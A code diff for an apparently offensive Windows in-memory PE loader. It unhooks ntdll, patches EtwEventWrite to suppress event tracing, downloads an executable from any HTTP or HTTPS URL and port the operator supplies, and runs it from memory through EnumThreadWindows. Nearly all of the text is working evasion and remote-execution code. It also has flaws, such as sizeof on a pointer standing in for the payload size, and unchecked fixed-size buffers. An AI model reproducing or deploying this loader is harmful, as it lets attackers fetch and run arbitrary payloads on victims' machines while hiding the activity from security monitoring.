@@ -1,4 +1,5 @@
-﻿#include <Windows.h>
+﻿#include <WinSock2.h>
+#include <Windows.h>
 #include <stdio.h>
 #include <winhttp.h>
 #include <vector>
@@ -9,6 +10,9 @@
 #include <string.h>
 #include <metahost.h> 
 #include <evntprov.h>
+
+#pragma warning (disable: 4996)
+#pragma comment(lib,"WS2_32.lib")
 
 #define PATH MAX_PATH
 
@@ -96,7 +100,7 @@ static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
 
 //  try to locate the address of EtwEventWrite function from ntdll.dll module
 // nothing get logged using this function.
-int DisableETW(void) {
+void DisableETW(void) {
     DWORD oldprotect = 0;
 
     unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
@@ -115,67 +119,6 @@ int DisableETW(void) {
 
     VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
     FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
-    return 0;
-}
-
-
-int SummonCLR(void) {
-    HRESULT hr;
-    ICLRMetaHost* pMetaHost = NULL;
-    IEnumUnknown* installedRuntimes = NULL;
-    ICLRRuntimeInfo* runtimeInfo = NULL;
-    ICLRRuntimeHost* runtimeHost = NULL;
-    ULONG fetched = 0;
-
-    //wprintf(L"[+] Now Loading CLR...\n");
-
-    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
-    if (hr != S_OK) {
-        //wprintf(L"[!] Error: CLRCreateInstance...\n");
-        goto Cleanup;
-    }
-
-    hr = pMetaHost->EnumerateInstalledRuntimes(&installedRuntimes);
-    if (hr != S_OK) {
-        //wprintf(L"[!] Error: EnumerateInstalledRuntimes...\n");
-        goto Cleanup;
-    }
-
-    WCHAR versionString[20];
-    while ((hr = installedRuntimes->Next(1, (IUnknown**)&runtimeInfo, &fetched)) == S_OK && fetched > 0) {
-        DWORD versionStringSize = 20;
-        hr = runtimeInfo->GetVersionString(versionString, &versionStringSize);
-
-        if (runtimeInfo != NULL) {
-            //wprintf(L"[+] Supported Framework: %s\n", versionString);
-        }
-
-        if (versionStringSize >= 2 && versionString[1] == '4') {	// Look for .NET 4.0 runtime.
-            //wprintf(L"[+] Using runtime: %s\n", versionString);
-            break;
-        }
-    }
-
-    hr = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (void**)&runtimeHost);
-    if (hr != S_OK) {
-        wprintf(L"[!] Error: GetInterface(CLSID_CLRRuntimeHost...) failed...\n");
-        goto Cleanup;
-    }
-
-    hr = runtimeHost->Start();
-    if (hr != S_OK) {
-        wprintf(L"[!] Error: Start runtimeHost failed...\n");
-        goto Cleanup;
-    }
-
-Cleanup:
-
-    if (pMetaHost) {
-        pMetaHost->Release();
-        pMetaHost = NULL;
-    }
-
-    return 0;
 }
 
 
@@ -299,6 +242,7 @@ void PELoader(char* data, const long long datasize)
 
     BYTE* pImageBase = NULL;
     LPVOID preferAddr = 0;
+    DWORD OldProtect = 0;
 
     //printf("  -- 1 GET NT Header\n");
     IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
@@ -329,7 +273,6 @@ void PELoader(char* data, const long long datasize)
             }
         }
     }
-
     //printf("  -- 4 FILL the memory block with PEdata\n");
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
@@ -348,7 +291,9 @@ void PELoader(char* data, const long long datasize)
     //printf("  -- 7 Rush the PE in Memory (size %ld)(addr %p)(chksum %ud)\n", datasize, retAddr, chksum);
     // No New Thread :
     //((void(*)())retAddr)(); // bad
+    //VirtualProtect(preferAddr, ntHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &OldProtect);
     EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
+    
 
     // create new thread mablanch:
     //printf("this is argument : %s\n", arguments); 
@@ -419,15 +364,12 @@ void NewNtdllPatchETW() {
 
     DisableETW();
 
-    LoadLibraryA("clr.dll");
-    SummonCLR();
-
     //printf("After disabling ETW\n");
 }
 
 
 // 
-char* GetPE(LPCWSTR domain, LPCWSTR path) {
+char* GetPE443(LPCWSTR domain, LPCWSTR path) {
     
     
     std::vector<unsigned char> PEbuf;
@@ -530,8 +472,328 @@ char* GetPE(LPCWSTR domain, LPCWSTR path) {
 }
 
 
-int main() {
+char* GetPE_HTTPSport(LPCWSTR domain, LPCWSTR path, DWORD port) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            port, 0);
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            WINHTTP_FLAG_SECURE);
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+char* GetPE80(LPCWSTR domain, LPCWSTR path) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            INTERNET_DEFAULT_HTTP_PORT, 0);
+    else
+        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            NULL);
+    else
+        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+    else
+        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE\n");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+char* GetPE_HTTPport(LPCWSTR domain, LPCWSTR path, DWORD port) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            port, 0);
+    else
+        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            NULL);
+    else
+        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+    else
+        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE\n");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+
+int main(int argc, char** argv) {
     
+
     printf("\n[+] Unhooking\n");
     printf("\n[+] Patch ETW \n");
     NewNtdllPatchETW();
@@ -542,21 +804,125 @@ int main() {
     char uri[250] = "";
     char argument[100] = "";
     scanf("%s", uri);
+    char* PE = NULL;
 
-    printf("\n[+] Loading Remote PE from %s\n",uri);
-    char domain[50];
-    char path[500];
-    sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);
+    if (!strncmp("https:", uri, 6)) {
+        printf("\n[+] Loading Remote PE from %s\n", uri);
+        char domain[50];
+        char path[500];
+        sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);
 
-    wchar_t Wdomain[50];
-    mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
-    wchar_t Wpath[500];
-    mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
+        wchar_t Wdomain[50];
+        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
+        wchar_t Wpath[500];
+        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
+        
+        const char* invalid_characters = ":";
+        char* mystring = domain;
+        char* c = domain;
+        int j = 0;
+        while (*c)
+        {
+            if (strchr(invalid_characters, *c))
+            {
+                int i = 0;
+                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
+                char realDomain[16] = "";
+                char strPort[10] = "";
+                DWORD port;
+                for (i = 0; i < j; i++) {
+                    realDomain[i] = domain[i];
+                }
+                //printf("realDomain : %s\n", realDomain);
+                j++;
+                for (i = j; i < sizeof(domain); i++) {
+                    strPort[i - j] = domain[i];
+                }
+                //printf("strPort  %s\n", strPort);
 
-    char* PE = GetPE(Wdomain, Wpath);
+                wchar_t WrealDomain[50];
+                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
+                //printf("WrealDomain %ws\n", WrealDomain);
+
+                port = atoi(strPort);
+
+                //printf("Wpath %ws\n", Wpath);
+                //printf("WrealDomain %ws\n", WrealDomain);
+                //printf("port %d\n", port);
+                PE = GetPE_HTTPSport(WrealDomain, Wpath, port);
+
+                goto jump;
+            }
+            j++;
+            c++;
+        }
+        //printf("Wdomain : %ws\n",Wdomain);
+        PE = GetPE443(Wdomain, Wpath);
+    }
+    else if(!strncmp(uri, "http:", 5)) {
+        printf("\n[+] Loading Remote PE from %s\n", uri);
+        char domain[50];
+        char path[500];
+        sscanf(uri, "http://%31[^/]/%63[^\n]", domain, path);
+
+        wchar_t Wdomain[50];
+        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
+        wchar_t Wpath[500];
+        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
+        
+        const char* invalid_characters = ":";
+        char* c = domain;
+        int j = 0;
+        while (*c)
+        {
+            if (strchr(invalid_characters, *c))
+            {
+                int i = 0;
+                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
+                char realDomain[16] = "";
+                char strPort[10] = "";
+                DWORD port;
+                for (i = 0; i < j; i++) {
+                    realDomain[i] = domain[i];
+                }
+                //printf("realDomain : %s\n", realDomain);
+
+                size_t origsize = strlen(realDomain) + 1;
+                const size_t newsize = 100;
+                size_t convertedChars = 0;
+                wchar_t WrealDomain[newsize];
+                mbstowcs_s(&convertedChars, WrealDomain, origsize, realDomain, _TRUNCATE);
+                //printf("WrealDomain %ws\n", WrealDomain);
+                j++;
+                for (i = j; i < sizeof(domain); i++) {
+                    strPort[i-j] = domain[i];
+                }
+                //printf("strPort  %s\n", strPort);
+                
+                
+                port = atoi(strPort);
+                
+                //printf("Wpath %ws\n", Wpath);
+                
+                //printf("port %d\n", port);
+                PE = GetPE_HTTPport(WrealDomain, Wpath, port);
+                
+                goto jump;
+            }
+            j++;
+            c++;
+        }
+
+        //printf("Wdomain : %ws\n",Wdomain);
+        //printf("Wpath   : %ws\n", Wpath);
+        PE = GetPE80(Wdomain, Wpath);
+
+    
+    }
+    
+    jump:
     size_t size = sizeof(PE);
-    printf("\n[+] Size of the PE : %d Bytes\n", size);
-   
+    
     printf("\n[+] Run PE\n\n\n");
     PELoader(PE, size);
     
